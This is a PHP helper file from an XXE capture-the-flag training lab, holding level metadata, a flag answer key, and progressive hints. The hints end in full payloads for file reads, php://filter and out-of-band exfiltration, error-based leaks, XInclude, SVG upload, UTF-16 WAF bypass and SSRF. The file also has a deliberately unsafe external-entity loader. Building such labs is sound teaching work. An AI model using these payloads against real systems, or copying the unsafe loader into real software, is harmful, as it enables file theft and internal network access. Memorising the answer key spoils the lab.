<?php
/**
 * XXE Lab - Helper Functions
 * Utility functions for the XML External Entity (XXE) challenge lab.
 */

/**
 * Returns the flag string for a given level ID.
 */
function get_flag_for_level(int $levelId): string {
    $flags = [
        1  => 'FLAG{xxe_file_read}',
        2  => 'FLAG{xxe_php_filter}',
        3  => 'FLAG{xxe_blind_oob}',
        4  => 'FLAG{xxe_error_based}',
        5  => 'FLAG{xxe_xinclude}',
        6  => 'FLAG{xxe_svg_upload}',
        7  => 'FLAG{xxe_encoding_bypass}',
        8  => 'FLAG{xxe_param_entity_chain}',
        9  => 'FLAG{xxe_ssrf}',
        10 => 'FLAG{xxe_waf_bypass}',
    ];
    return $flags[$levelId] ?? '';
}

/**
 * Level metadata used by index.php and submit.php.
 *
 * @return array<int, array{title:string, difficulty:string, badge:string, desc:string}>
 */
function get_level_meta(): array {
    return [
        1  => ['title' => 'Classic XXE File Read',            'difficulty' => 'easy',   'badge' => 'Easy',   'desc' => 'An external general entity is substituted straight into the parsed document. The simplest XXE: read a file off the server filesystem.'],
        2  => ['title' => 'php://filter Source Read',         'difficulty' => 'easy',   'badge' => 'Easy',   'desc' => 'A file with markup characters corrupts a raw entity read. Wrap it in php://filter/convert.base64-encode to exfiltrate the source intact.'],
        3  => ['title' => 'Blind XXE (Out-of-Band)',          'difficulty' => 'medium', 'badge' => 'Medium', 'desc' => 'No entity is reflected in the response. Pull in an external DTD that ships the secret to an internal collector, then confirm the callback.'],
        4  => ['title' => 'Error-Based XXE',                  'difficulty' => 'medium', 'badge' => 'Medium', 'desc' => 'Output is suppressed, but parser errors are shown. Force libxml to fail loading a path built from the secret so the file content leaks in the message.'],
        5  => ['title' => 'XInclude File Read',               'difficulty' => 'medium', 'badge' => 'Medium', 'desc' => 'The DOCTYPE is stripped, so classic entities are dead. XInclude needs no DTD — pull the file in with an xi:include element instead.'],
        6  => ['title' => 'XXE via SVG Upload',               'difficulty' => 'medium', 'badge' => 'Medium', 'desc' => 'An image processor parses uploaded SVG (which is XML). Embed a DOCTYPE in the SVG and the entity resolves as the "image" is read.'],
        7  => ['title' => 'DOCTYPE Filter — Encoding Bypass', 'difficulty' => 'hard',   'badge' => 'Hard',   'desc' => 'A WAF blocks the ASCII string <!DOCTYPE. Encode the whole document as UTF-16 so the bytes no longer match — libxml still parses it.'],
        8  => ['title' => 'Parameter-Entity Chaining',        'difficulty' => 'hard',   'badge' => 'Hard',   'desc' => 'Chain nested parameter entities in an external DTD to build a general entity that carries the file content back into the body.'],
        9  => ['title' => 'SSRF via XXE',                     'difficulty' => 'hard',   'badge' => 'Hard',   'desc' => 'Point the entity at an internal-only URL. The parser fetches it server-side from 127.0.0.1, reaching a service the browser cannot.'],
        10 => ['title' => 'Multi-Layer WAF Bypass',           'difficulty' => 'expert', 'badge' => 'Expert', 'desc' => 'Three stacked ASCII filters block <!DOCTYPE, SYSTEM and file://. One encoding trick makes every filter blind at once.'],
    ];
}

/**
 * Returns an array of 5 progressive hints for each level.
 */
function get_level_hints(int $levelId): array {
    $hints = [
        1 => [
            'The XML you submit is parsed with external entities <strong>enabled</strong> (<code>libxml_set_external_entity_loader</code> + <code>LIBXML_NOENT | LIBXML_DTDLOAD</code>). Whatever an entity points at gets resolved and substituted into the document.',
            'You define entities inside a <code>DOCTYPE</code> declaration (the internal DTD subset): <code>&lt;!DOCTYPE root [ ... ]&gt;</code>.',
            'An <em>external</em> entity uses the <code>SYSTEM</code> keyword and a URI: <code>&lt;!ENTITY xxe SYSTEM "file:///path"&gt;</code>. Referencing <code>&amp;xxe;</code> in the body pulls the file content in.',
            'The target secret for this level lives at <code>/var/secret/flag1.txt</code>. Put <code>&amp;xxe;</code> inside the element the page reads (<code>&lt;item&gt;</code>).',
            'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM "file:///var/secret/flag1.txt"&gt; ]&gt;<br>&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;</code>',
        ],
        2 => [
            'The secret here is a PHP config file (<code>/var/secret/flag2.php</code>). Reading it raw with <code>file://</code> injects <code>&lt;?php ...</code> into the XML, which libxml mangles as a processing instruction — the flag never reaches the text output.',
            'PHP stream wrappers can transform a file before it is embedded. The <code>php://filter</code> wrapper is available to <code>file_get_contents</code> and to XXE entity loading.',
            'The <code>convert.base64-encode</code> filter turns the file into pure base64 — only <code>A-Z a-z 0-9 + / =</code>, all safe inside XML text.',
            'Point the entity at <code>php://filter/convert.base64-encode/resource=/var/secret/flag2.php</code>, then base64-decode the output you get back.',
            'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/secret/flag2.php"&gt; ]&gt;<br>&lt;order&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;/order&gt;</code><br>Decode the base64 to read the flag.',
        ],
        3 => [
            'This response never echoes an entity, so a direct <code>&amp;xxe;</code> read is useless — this is <strong>blind</strong> XXE. Data has to leave the parser <em>out-of-band</em>.',
            'The internal subset cannot reference a parameter entity inside another markup declaration, but an <strong>external</strong> DTD can. The lab hosts a malicious one at <code>http://127.0.0.1/oob.dtd</code>.',
            'Your job is only to pull that external DTD in. Declare an external parameter entity and reference it: <code>&lt;!ENTITY % remote SYSTEM "http://127.0.0.1/oob.dtd"&gt;</code> then <code>%remote;</code>.',
            'The hosted DTD reads <code>/var/secret/flag3.txt</code>, base64-encodes it, and sends it to <code>http://127.0.0.1/collector.php?data=...</code>. The collector records the callback and this page confirms it server-side.',
            'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [<br>&nbsp; &lt;!ENTITY % remote SYSTEM "http://127.0.0.1/oob.dtd"&gt;<br>&nbsp; %remote;<br>]&gt;<br>&lt;root&gt;ping&lt;/root&gt;</code>',
        ],
        4 => [
            'You get no entity output, but libxml <em>parser errors</em> are printed. Error-based XXE smuggles file content into an error message.',
            'The idea: read the secret into a parameter entity, then try to open a second URI built from that content. libxml fails to load it and prints the full (secret-containing) URI it tried.',
            'That nested-entity trick is only legal in an <strong>external</strong> DTD. The lab hosts one at <code>http://127.0.0.1/error.dtd</code> that reads <code>/var/secret/flag4.txt</code> and forces the failing load.',
            'You only need to include the external DTD via a parameter entity, exactly like the blind level — but here you read the error box instead of a collector.',
            'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [<br>&nbsp; &lt;!ENTITY % remote SYSTEM "http://127.0.0.1/error.dtd"&gt;<br>&nbsp; %remote;<br>]&gt;<br>&lt;root/&gt;</code><br>The flag appears inside the "failed to load external entity" error.',
        ],
        5 => [
            'This parser strips any <code>&lt;!DOCTYPE</code> declaration before parsing, so you cannot declare entities at all. But XXE is not the only way to pull external content into XML.',
            '<strong>XInclude</strong> is an XML feature that includes other resources without a DTD. The server calls <code>$dom-&gt;xinclude()</code> after loading your document.',
            'You need the XInclude namespace on an element and an <code>&lt;xi:include&gt;</code> child: <code>xmlns:xi="http://www.w3.org/2001/XInclude"</code>.',
            'Use <code>parse="text"</code> so the file is pulled in as raw text (not parsed as XML), and point <code>href</code> at <code>file:///var/secret/flag5.txt</code>.',
            'Full payload:<br><code>&lt;data xmlns:xi="http://www.w3.org/2001/XInclude"&gt;<br>&nbsp; &lt;xi:include parse="text" href="file:///var/secret/flag5.txt"/&gt;<br>&lt;/data&gt;</code>',
        ],
        6 => [
            'SVG is just XML. The upload endpoint parses the file you send with the same entity-enabled parser — a DOCTYPE inside the SVG is honoured.',
            'Build a valid SVG document but add an internal DTD that declares an external entity for <code>/var/secret/flag6.txt</code>.',
            'Reference the entity inside a text-bearing element such as <code>&lt;text&gt;&amp;xxe;&lt;/text&gt;</code> so the resolved content shows up when the SVG text is read.',
            'Save the payload as a <code>.svg</code> file and upload it with the file picker (a paste box is also provided for convenience).',
            'Full SVG payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///var/secret/flag6.txt"&gt; ]&gt;<br>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code>',
        ],
        7 => [
            'The WAF rejects the request if the raw bytes contain the ASCII string <code>&lt;!DOCTYPE</code> (case-insensitive). Submitting a normal UTF-8 payload is blocked.',
            'That check only sees ASCII bytes. If the document is transferred in a different character encoding, the bytes of <code>&lt;!DOCTYPE</code> change and the substring match fails.',
            'libxml auto-detects the encoding from a byte-order mark / the XML declaration, so it still parses a <strong>UTF-16</strong> document correctly even though the WAF saw nothing.',
            'Write the classic file-read payload, declare <code>encoding="UTF-16"</code>, and choose <strong>UTF-16</strong> in the transfer-encoding selector so the server receives it as UTF-16 bytes.',
            'Payload (select UTF-16 encoding):<br><code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;<br>&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM "file:///var/secret/flag7.txt"&gt; ]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>',
        ],
        8 => [
            'This level is about <em>parameter</em> entities (<code>%name;</code>) and chaining several of them so one builds the next.',
            'You cannot chain nested entity definitions in the internal subset, so the lab hosts the chain in an external DTD at <code>http://127.0.0.1/chain.dtd</code>.',
            'That DTD defines <code>%f1</code> = the file content, and <code>%f2</code> = a declaration for a general entity <code>&amp;chained;</code> whose value is <code>%f1;</code>. Referencing <code>%f2;</code> executes that declaration, so each entity depends on the previous one.',
            'You pull the chain in with a parameter entity, then reference <code>&amp;chained;</code> in the body to reflect <code>/var/secret/flag8.txt</code> into the output.',
            'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [<br>&nbsp; &lt;!ENTITY % remote SYSTEM "http://127.0.0.1/chain.dtd"&gt;<br>&nbsp; %remote;<br>]&gt;<br>&lt;root&gt;&amp;chained;&lt;/root&gt;</code>',
        ],
        9 => [
            'An external entity URI does not have to be <code>file://</code> — the parser will fetch <code>http://</code> URLs too, from the server\'s own network position.',
            'There is an internal service at <code>http://127.0.0.1/internal.php</code> that only answers requests coming from 127.0.0.1. Your browser cannot reach it, but the XML parser can.',
            'Declare a <code>SYSTEM</code> entity pointing at that URL and reference it in the body. The parser makes the request for you (Server-Side Request Forgery).',
            'The internal service returns the flag only to localhost callers, so the response comes straight back through your entity.',
            'Full payload:<br><code>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM "http://127.0.0.1/internal.php"&gt; ]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>',
        ],
        10 => [
            'Three filters run on the raw bytes (case-insensitive): Layer 1 blocks <code>&lt;!DOCTYPE</code>, Layer 2 blocks <code>SYSTEM</code>, Layer 3 blocks <code>file://</code>. A normal payload trips all three.',
            'All three checks are plain ASCII substring matches. They share one blind spot: they only understand ASCII bytes.',
            'If the document is sent in <strong>UTF-16</strong>, none of <code>&lt;!DOCTYPE</code>, <code>SYSTEM</code> or <code>file://</code> appears as ASCII in the byte stream — every layer passes — yet libxml still parses it from the BOM.',
            'Take the classic file read for <code>/var/secret/flag10.txt</code>, declare <code>encoding="UTF-16"</code>, and pick <strong>UTF-16</strong> in the transfer-encoding selector.',
            'Payload (select UTF-16 encoding):<br><code>&lt;?xml version="1.0" encoding="UTF-16"?&gt;<br>&lt;!DOCTYPE root [ &lt;!ENTITY xxe SYSTEM "file:///var/secret/flag10.txt"&gt; ]&gt;<br>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>',
        ],
    ];
    return $hints[$levelId] ?? [];
}

/**
 * Renders a progressive hint section with a "Show Next Hint" button.
 * Each call shares the same JS listener (rendered only once via static flag).
 */
function render_hint_section(array $hints, string $title = 'Hints'): string {
    if (empty($hints)) return '';
    static $scriptRendered = false;
    $id = uniqid('hint_', false);
    ob_start();
    ?>
    <div class="hints" id="<?= $id ?>">
        <h3><?= htmlspecialchars($title) ?></h3>
        <button class="hint-btn" data-hint-target="<?= $id ?>">Show Next Hint (0/<?= count($hints) ?>)</button>
        <ul class="hint-list">
            <?php foreach ($hints as $hint): ?>
            <li class="hint-item" hidden><?= $hint ?></li>
            <?php endforeach; ?>
        </ul>
    </div>
    <?php
    if (!$scriptRendered) {
        $scriptRendered = true;
        ?>
        <script>
        document.addEventListener('click', function(e) {
            if (!e.target.classList.contains('hint-btn')) return;
            const targetId = e.target.getAttribute('data-hint-target');
            const container = document.getElementById(targetId);
            const items = container.querySelectorAll('.hint-item[hidden]');
            const total = container.querySelectorAll('.hint-item').length;
            if (items.length > 0) {
                items[0].removeAttribute('hidden');
                const shown = total - items.length + 1;
                e.target.textContent = shown < total ? 'Show Next Hint (' + shown + '/' + total + ')' : 'All hints shown';
                if (shown >= total) e.target.disabled = true;
            }
        });
        </script>
        <?php
    }
    return ob_get_clean();
}

/**
 * Register the (deliberately unsafe) libxml external-entity loader.
 *
 * Modern libxml refuses to load external entities by default. Registering a
 * loader that opens whatever URI the document asks for is exactly what makes
 * these levels vulnerable — file://, php://filter and http:// all resolve.
 * Returns null on failure so libxml reports the load error (used by the
 * error-based level).
 */
function xxe_register_loader(): void {
    libxml_set_external_entity_loader(
        static function (?string $publicId, ?string $systemId, array $context) {
            if ($systemId === null || $systemId === '') {
                return null;
            }
            $fp = @fopen($systemId, 'rb');
            return $fp ?: null;
        }
    );
}

/**
 * True when the resolved text carries the level flag — either directly, or
 * after base64-decoding it (php://filter / chained-entity levels return b64).
 */
function xxe_contains_flag(?string $text, string $flag): bool {
    if ($text === null || $text === '') {
        return false;
    }
    if (strpos($text, $flag) !== false) {
        return true;
    }
    $decoded = base64_decode(trim($text), true);
    return $decoded !== false && strpos($decoded, $flag) !== false;
}

/**
 * True when any captured libxml error message contains the flag
 * (used by the error-based level).
 */
function xxe_error_contains_flag(array $errors, string $flag): bool {
    foreach ($errors as $err) {
        if (isset($err->message) && strpos($err->message, $flag) !== false) {
            return true;
        }
    }
    return false;
}

/* ─────────────────────────────────────────────────────────────
   Out-of-band collector store (level 3)
   Shared by collector.php (writer) and level3.php (reader).
   Kept in the system temp dir so it is writable regardless of the
   volume-mounted web root ownership.
   ───────────────────────────────────────────────────────────── */
function xxe_collector_path(): string {
    return sys_get_temp_dir() . '/xxe_collector.json';
}

function xxe_collector_record(string $rawData): void {
    $path    = xxe_collector_path();
    $entries = [];
    if (is_file($path)) {
        $decoded = json_decode((string)@file_get_contents($path), true);
        if (is_array($decoded)) $entries = $decoded;
    }
    $plain = base64_decode($rawData, true);
    $entries[] = [
        'time'    => time(),
        'raw'     => $rawData,
        'decoded' => $plain !== false ? $plain : $rawData,
    ];
    // Keep only the most recent 25 callbacks.
    $entries = array_slice($entries, -25);
    @file_put_contents($path, json_encode($entries), LOCK_EX);
}

/**
 * Returns the most recent captured callback (within $window seconds) whose
 * decoded value contains $flag, or null.
 *
 * @return array{time:int, raw:string, decoded:string}|null
 */
function xxe_collector_recent_hit(string $flag, int $window = 120): ?array {
    $path = xxe_collector_path();
    if (!is_file($path)) return null;
    $entries = json_decode((string)@file_get_contents($path), true);
    if (!is_array($entries)) return null;
    $now = time();
    for ($i = count($entries) - 1; $i >= 0; $i--) {
        $e = $entries[$i];
        if (!isset($e['decoded'], $e['time'])) continue;
        if (($now - (int)$e['time']) > $window) continue;
        if (strpos((string)$e['decoded'], $flag) !== false) {
            return $e;
        }
    }
    return null;
}

/**
 * Handle inline flag submission on a level page.
 * Only acts when POST contains _flag_submit=1.
 *
 * @return array{status: string|null, message: string, already_completed: bool}
 */
function handle_inline_flag_submit(int $levelId): array
{
    $result = ['status' => null, 'message' => '', 'already_completed' => false];

    $completed = [];
    if (!empty($_COOKIE['xxe_lab_progress'])) {
        $decoded = json_decode($_COOKIE['xxe_lab_progress'], true);
        if (is_array($decoded)) $completed = $decoded;
    }
    $result['already_completed'] = in_array($levelId, $completed);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['_flag_submit'])) {
        return $result;
    }

    $flag = trim($_POST['submitted_flag'] ?? '');
    if ($flag === '') {
        $result['status']  = 'error';
        $result['message'] = 'Please enter a flag.';
        return $result;
    }

    if ($flag === get_flag_for_level($levelId)) {
        if (!in_array($levelId, $completed)) {
            $completed[] = $levelId;
            sort($completed);
            setcookie('xxe_lab_progress', json_encode($completed), time() + 86400 * 30, '/');
        }
        $result['status']           = 'success';
        $result['message']          = 'Correct! Flag accepted.';
        $result['already_completed'] = true;
    } else {
        $result['status']  = 'error';
        $result['message'] = 'Incorrect flag. Keep trying!';
    }

    return $result;
}

/**
 * Render the compact inline flag submit form.
 *
 * @param array{status: string|null, message: string, already_completed: bool} $result
 */
function render_inline_flag_form(int $levelId, array $result): string
{
    $status           = $result['status'] ?? null;
    $message          = $result['message'] ?? '';
    $alreadyCompleted = $result['already_completed'] ?? false;

    ob_start();
    ?>
    <div class="inline-flag-submit">
        <h3>Submit Flag</h3>
        <div class="form-inner">
            <?php if ($status === 'success'): ?>
                <div class="message success"><?= htmlspecialchars($message) ?> &mdash; <a href="submit.php">view all progress &rarr;</a></div>
            <?php elseif ($status === 'error'): ?>
                <div class="message error"><?= htmlspecialchars($message) ?></div>
            <?php endif; ?>
            <?php if ($alreadyCompleted && $status !== 'success'): ?>
                <div class="message info">Level <?= (int)$levelId ?> already completed. <a href="submit.php">View progress &rarr;</a></div>
            <?php endif; ?>
            <?php if (!$alreadyCompleted || $status === 'error'): ?>
            <form method="POST" action="">
                <input type="hidden" name="_flag_submit" value="1">
                <div class="inline-flag-row">
                    <input type="text" name="submitted_flag" class="form-control"
                           placeholder="FLAG{...}" autocomplete="off" spellcheck="false"
                           value="<?= htmlspecialchars($_POST['submitted_flag'] ?? '') ?>">
                    <button type="submit" class="btn btn-primary">Check</button>
                </div>
            </form>
            <?php endif; ?>
        </div>
    </div>
    <?php
    return ob_get_clean();
}
